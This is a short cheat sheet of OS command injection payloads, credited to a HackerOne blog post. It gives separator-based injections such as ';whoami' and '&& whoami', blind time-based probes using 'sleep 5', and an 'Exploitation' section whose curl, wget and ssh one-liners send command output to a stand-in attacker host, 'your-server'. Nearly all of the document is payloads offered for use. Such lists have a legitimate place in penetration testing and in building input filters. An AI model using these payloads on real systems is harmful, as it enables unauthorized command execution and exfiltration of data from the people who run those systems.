# Normal Tests
`` `whoami` ``

;whoami

&& whoami

| whoami

# For Testing blind Command Injection 
;sleep 5

&& sleep 5

| sleep 5

`` `sleep 5` ``

$(sleep 5)


# Exploitation

whoami | curl http://your-server -d @-

wget http://your-server/$(whoami)

export C=whoami | ssh user@your-server

# Source 
[Thanks to hackerone!](https://www.hackerone.com/blog/how-to-command-injections)
